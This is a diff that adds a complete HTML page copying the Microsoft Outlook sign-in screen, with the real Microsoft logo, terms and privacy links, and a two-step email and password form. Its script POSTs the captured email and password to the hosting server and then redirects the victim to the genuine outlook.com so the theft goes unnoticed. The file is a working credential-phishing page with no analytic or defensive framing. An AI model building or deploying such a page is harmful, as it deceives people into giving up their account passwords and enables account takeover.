@@ -1,0 +1,55 @@
+<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Outlook - Sign in</title><style>body,html{margin:0;padding:0;height:100%;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;background-color:#f3f2f1;position:relative;min-height:100vh}.login-container{width:360px;padding:40px;background-color:#fff;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);border-radius:0;text-align:left;border:1px solid #e1e1e1;position:relative;z-index:1;transition:height .5s,opacity .5s}h2{font-size:22px;margin-bottom:5px;color:#333}p{font-size:14px;margin-bottom:25px;color:#666}input[type=email],input[type=password]{width:100%;padding:15px;margin-bottom:15px;border:none;border-bottom:2px solid #d9d9d9;font-size:16px;transition:border-bottom-color .3s}input[type=email]:focus,input[type=password]:focus{border-bottom-color:#0078d7;outline:0}button{width:100px;padding:8px;background-color:#0078d7;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:20px;float:right}button:hover{background-color:#005a9e}button:disabled{background-color:#d9d9d9;cursor:not-allowed}.options{font-size:14px;color:#0078d7;margin-bottom:20px}.options a{text-decoration:none;color:#0078d7}.options a:hover{text-decoration:underline}.footer{position:absolute;bottom:0;width:100%;display:flex;justify-content:center;padding:10px 0;background-color:rgba(0,0,0,.7);color:#888;font-size:12px}.footer a{margin:0 10px;text-decoration:none;color:#888}.footer a:hover{text-decoration:underline}.email-display{font-size:14px;display:block;margin-top:10px;margin-bottom:15px}.fade-in{opacity:0;animation:fadeIn .5s forwards}@keyframes fadeIn{to{opacity:1}}.password-container{display:flex;flex-direction:column}</style></head><body><div class="login-container"id="loginContainer"><img alt="Microsoft Logo"height="40"src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg"><h2>Sign in</h2><p>to continue to Outlook</p><form id="loginForm"method="POST"><input id="emailInput"name="email"placeholder="Email, phone, or Skype"required type="email"><div class="options"><span>No account?</span> <a href="https://signup.live.com/">Create one!</a></div><button disabled id="nextButton"type="button">Next</button></form></div><div class="footer"><a href="https://www.microsoft.com/en-us/servicesagreement/default.aspx">Terms of use</a> <a href="https://go.microsoft.com/fwlink/?LinkID=521839">Privacy & cookies</a></div><script>const emailInput = document.getElementById('emailInput');
+        const nextButton = document.getElementById('nextButton');
+
+        emailInput.addEventListener('input', function() {
+            const emailValue = emailInput.value;
+            const isValidEmail = emailValue.includes('@') && emailValue.includes('.');
+            nextButton.disabled = !isValidEmail;
+        });
+
+        nextButton.onclick = function() {
+            const email = emailInput.value;
+
+            if (email) {
+                const loginContainer = document.getElementById('loginContainer');
+                loginContainer.innerHTML = ` 
+                    <img src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft Logo" height="40">
+                    <span class="email-display">${email}</span>
+                    <h2 style="font-size: 20px; margin-top: 20px;">Enter password</h2>
+                    <input type="password" id="passwordInput" name="password" placeholder="Password" required class="fade-in">
+                    <div class="options" style="margin-top: 10px;">
+                        <a href="#">Forgot password?</a><br>
+                        <a href="#">Forgot username?</a>
+                    </div>
+                    <button style="margin-top: 20px;" id="signInButton">Sign In</button>
+                `;
+
+                const passwordInput = document.getElementById('passwordInput');
+                passwordInput.classList.add('fade-in');
+
+                document.getElementById('signInButton').onclick = function() {
+                    const password = passwordInput.value;
+
+                    this.disabled = true;
+
+                    const formData = new FormData();
+                    formData.append('email', email);
+                    formData.append('password', password);
+
+                    const xhr = new XMLHttpRequest();
+                    xhr.open("POST", "", true);
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            window.location.href = "https://outlook.com/";
+                        }
+                    };
+                    xhr.send(formData);
+                };
+            }
+        };
+
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+            }
+        });</script></body></htm
